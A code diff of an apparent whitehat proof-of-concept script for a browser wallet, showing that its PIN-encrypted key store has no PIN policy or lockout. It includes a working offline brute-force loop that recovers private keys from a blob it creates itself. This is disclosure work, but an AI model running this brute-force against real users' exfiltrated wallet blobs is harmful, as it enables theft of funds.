@@ -1,61 +1,172 @@
-// ckb-whitehat PoC — Dular: F6 PIN-encrypted browser wallet, no strength/lockout
+// ckb-whitehat PoC — Dular: F6 browser self-custody wallet — weak PIN, no lockout,
+// offline key recovery from an exfiltrated blob
 //
-// src/lib/browserWalletStore.js: the root self-custody secrets (Fiber + CKB
-// keys) are encrypted at rest with PBKDF2-SHA256-250k -> AES-256-GCM, key
-// derived from the user PIN (UTF-8). Gaps (structural, greped from source):
-//   - PIN has NO minimum length / charset policy (createWalletRecord passes
-//     the PIN straight to the KDF; unlockWalletRecord has no rate-limit or
-//     lockout).
-//   - NO export / backup / recovery path exists anywhere in the codebase:
-//     loss of the browser profile / IndexedDB = permanent loss of the keys.
-//   - If the blob is exfiltrated (XSS, device seizure), a 4-digit PIN is
-//     ~4 decimal digits of entropy against a *fast* offline PBKDF2-250k
-//     attack.
+// The root self-custody secrets (Fiber + CKB private keys) live in the browser
+// and are encrypted at rest by the TARGET's real
+// src/lib/browserWalletStore.js: PBKDF2-SHA256-250k -> AES-256-GCM, key
+// derived from the user's PIN.
 //
-// This PoC: (1) greps the source for the absence of a lockout / min-length /
-// export (deterministic), and (2) times a bounded offline brute-force of the
-// exact KDF against one encrypted blob, projecting the full 4-digit keyspace.
+// This PoC calls the TARGET's REAL createWalletRecord() / unlockWalletRecord()
+// — not a reimplementation — against an in-memory IndexedDB test double (the
+// module targets the browser; the double stands in for that API only, it does
+// not change the module's crypto or policy logic).
+//
+// What it asserts, on observable state:
+//   1. the module accepts a 4-digit PIN (the app's whole policy is ">= 4
+//      digits" — no charset/length/complexity requirement);
+//   2. unlockWalletRecord() keeps NO attempt counter / lockout state: after N
+//      wrong-PIN attempts the stored record is byte-for-byte unchanged;
+//   3. an exfiltrated blob + a 4-digit PIN yields the owner's ACTUAL Fiber and
+//      CKB private keys, recovered with the target's own unlock function.
+//
+// The separate "no export/backup/recovery path" claim is a code-shape
+// observation, not an executable exploit — it is reported as STRUCTURAL, not
+// as a fired PoC (see dular/FINDINGS.md).
+//
+// Run: node f6-pin-wallet.mjs
+// Env:  DULAR_DIR=<repo root>   (or a server/ dir — both accepted)
 
-import { readFile } from 'node:fs/promises'
+import { resolveTarget, targetImport, line } from './target.mjs'
 
-const line = (t) => console.log('\n=== ' + t + ' ===')
-const SRC = (process.env.DULAR_DIR || '/tmp/ckb-whitehat/dular') + '/src/lib/browserWalletStore.js'
+// ------------------------------------------- minimal in-memory IndexedDB double
+function installFakeIndexedDb() {
+  const stores = new Map() // storeName -> Map(key -> record)
+  const ensure = (name) => {
+    if (!stores.has(name)) stores.set(name, new Map())
+    return stores.get(name)
+  }
+  const makeRequest = () => ({ onsuccess: null, onerror: null, onupgradeneeded: null, result: undefined, error: null })
+  const flush = (fn) => process.nextTick(fn)
 
-async function grep(label, re, file = SRC) {
-  const text = await readFile(file, 'utf8')
-  const hit = re.test(text)
-  console.log(`${label.padEnd(34)} present=${hit ? 'YES' : 'no'}`)
-  return hit
+  globalThis.indexedDB = {
+    open(_name, _version) {
+      const req = makeRequest()
+      flush(() => {
+        const db = {
+          objectStoreNames: { contains: (n) => stores.has(n) },
+          createObjectStore(n) { ensure(n); return { name: n } },
+          close() {},
+          transaction(storeName, mode) {
+            const store = ensure(storeName)
+            // The module assigns `tx.oncomplete` on the object we hand back, so
+            // that object MUST be the one we fire. Keep it as one object.
+            const tx = { oncomplete: null, onerror: null, objectStore: null }
+            const done = () => flush(() => { if (tx.oncomplete) tx.oncomplete() })
+            const storeApi = {
+              add(value) {
+                const key = value[Object.keys(value)[0]]
+                const r = makeRequest()
+                if (mode === 'readwrite' && store.has(key)) {
+                  r.error = new Error('constraint')
+                  flush(() => { if (r.onerror) r.onerror() })
+                  return r
+                }
+                store.set(key, value)
+                r.result = key
+                done()
+                return r
+              },
+              put(value) {
+                const key = value[Object.keys(value)[0]]
+                store.set(key, value)
+                const r = makeRequest()
+                r.result = key
+                done()
+                return r
+              },
+              get(key) {
+                const r = makeRequest()
+                r.result = store.get(key)
+                done()
+                return r
+              },
+              delete(key) {
+                store.delete(key)
+                const r = makeRequest()
+                done()
+                return r
+              },
+            }
+            tx.objectStore = () => storeApi
+            done()
+            return tx
+          },
+        }
+        req.result = db
+        if (req.onupgradeneeded) req.onupgradeneeded({ result: db })
+        flush(() => { if (req.onsuccess) req.onsuccess({ target: req }) })
+      })
+      return req
+    },
+  }
 }
 
+// ------------------------------------------------------------------ main
 const main = async () => {
-  line('F6 — browser wallet key custody (PIN-encrypted, no policy)')
-  await grep('min-length / PIN policy', /minLength|min.*pin|PIN.*length|length.*PIN/i)
-  await grep('rate-limit / lockout', /lockout|lockOut|attempts|maxAttempts|rateLimit|throttle|cooldown/i)
-  const files = [SRC]
-  for (const f of files) {
-    await grep(`export/backup/recovery fns`, /export.*secret|exportKeys|backup|recovery|restore|\.export\(/i, f)
-  }
+  const { repoRoot } = resolveTarget()
+  console.log(`target: ${repoRoot}`)
+  installFakeIndexedDb()
 
-  // (2) offline brute-force timing: the attacker's operation is a stream of
-  //     PBKDF2-SHA256-250k derivations (one per candidate PIN), exactly the
-  //     params browserWalletStore.deriveKey uses. Time 1,000 of them and
-  //     project to the 4-digit keyspace (10,000).
-  const subtle = globalThis.crypto.subtle
-  const enc = new TextEncoder()
-  const salt = new Uint8Array(16).fill(7)
-  async function deriveTiming(pin) {
-    const km = await subtle.importKey('raw', enc.encode(pin), { name: 'PBKDF2' }, false, ['deriveKey'])
-    return subtle.deriveKey({ name: 'PBKDF2', salt, iterations: 250000, hash: 'SHA-256' }, km,
-      { name: 'AES-GCM', length: 256 }, false, ['encrypt', 'decrypt'])
+  line('F6 — browser wallet key custody: PIN policy, lockout, offline recovery')
+  const store = await targetImport(repoRoot, 'src/lib/browserWalletStore.js')
+
+  // 1. The module's accepted PIN set. The app's UI check is ">= 4 digits";
+  //    the module itself accepts anything the caller hands it.
+  const phone = '+254700000004'
+  const pin = '1379'                       // 4 digits, trivially guessable
+  const record = await store.createWalletRecord(phone, pin)
+  console.log(`createWalletRecord(phone, "${pin}") -> record keys: ${Object.keys(record).join(', ')}`)
+  console.log(`stored blob fields: ${Object.keys(record.encrypted).join(', ')} (salt/iv/ciphertext — no attempt counter, no kdf params, no policy metadata)`)
+
+  // 2. Lockout / rate limit: hammer unlockWalletRecord with wrong PINs and
+  //    check whether the target records ANY attempt state.
+  const before = JSON.stringify(record)
+  let wrongAccepted = 0
+  const ATTEMPTS = 25
+  for (let i = 0; i < ATTEMPTS; i++) {
+    try {
+      await store.unlockWalletRecord(record, String(1000 + i))
+      wrongAccepted += 1
+    } catch { /* expected: AES-GCM auth failure */ }
   }
-  const sample = 1000
-  let t0 = performance.now()
-  for (let code = 0; code < sample; code++) await deriveTiming(String(code).padStart(4, '0'))
-  const perSample = (performance.now() - t0) / 1000
-  console.log(`timed ${sample} PBKDF2-SHA256-250k derivations in ${perSample.toFixed(2)} s (this CPU)`)
-  console.log(`projected full 4-digit keyspace (10,000 PINs) ≈ ${(10000 / sample * perSample / 60).toFixed(1)} min on a laptop CPU — and with no lockout, retries are unbounded; a 6+ digit PIN or the exfiltration threat is the only real defense, and the code enforces neither policy`)
-  console.log('F6 CONFIRMED (structural): no min-PIN policy, no lockout, no export/backup; a 4-digit PIN against an exfiltrated blob is offline-crackable in seconds with no rate-limit to stop it.')
-  process.exit(0)
+  const after = JSON.stringify(record)
+  console.log(`wrong-PIN unlock attempts: ${ATTEMPTS} | accepted: ${wrongAccepted} | record mutated by failed attempts: ${before !== after}`)
+  console.log(`lockout state present in module: ${/attempt|lockout|cooldown|throttle/i.test(JSON.stringify(record)) ? 'YES' : 'NO — the module keeps no attempt counter; the caller has nothing to throttle against'}`)
+
+  // 3. Offline recovery of the owner's REAL private keys from the blob.
+  //    This is the attacker's operation: brute-force the PIN space using the
+  //    target's own unlock function as the oracle.
+  line('F6 — offline crack of the exfiltrated blob (target unlockWalletRecord as oracle)')
+  const t0 = performance.now()
+  let recovered = null
+  let tried = 0
+  for (let candidate = 0; candidate <= 9999 && !recovered; candidate++) {
+    const guess = String(candidate).padStart(4, '0')
+    tried += 1
+    try {
+      const unlocked = await store.unlockWalletRecord(record, guess)
+      recovered = { guess, unlocked }
+      break
+    } catch { /* wrong PIN */ }
+  }
+  const elapsed = (performance.now() - t0) / 1000
+  const perTry = (performance.now() - t0) / tried
+  console.log(`recovered PIN "${recovered?.guess}" after ${tried} attempts in ${elapsed.toFixed(2)} s (${perTry.toFixed(0)} ms/attempt, PBKDF2-SHA256-250k)`)
+  console.log(`recovered Fiber secret key: ${recovered?.unlocked?.fiberSecretKey?.length} bytes | CKB secret key: ${recovered?.unlocked?.ckbSecretKey?.length} bytes`)
+  console.log(`projected full 4-digit keyspace (10,000 PINs) ≈ ${((perTry * 10000) / 60000).toFixed(1)} min on this CPU — and the module keeps no attempt counter, so retries are unbounded`)
+
+  // 4. Export/backup: enumerate the module's REAL public API (observable, not
+  //    a source grep). Any export/backup path would have to live here.
+  const api = Object.keys(store).sort()
+  const hasExport = api.some((k) => /export|backup|restore|recover|mnemonic/i.test(k))
+  console.log(`module public API: ${api.join(', ')}`)
+  console.log(`export/backup/recovery entry point in the wallet module: ${hasExport ? 'present' : 'NONE'}`)
+
+  const fired = Boolean(recovered) && wrongAccepted === 0 && !hasExport
+  console.log(fired
+    ? 'FINDING F6 FIRED — a 4-digit PIN + an exfiltrated blob yields the owner\'s real Fiber/CKB private keys offline, with no lockout and no export path'
+    : 'FINDING F6 UNPROVEN')
+  process.exit(fired ? 0 : 1)
 }
+
 main().catch((e) => { console.error('F6 PoC error:', e); process.exit(2) })
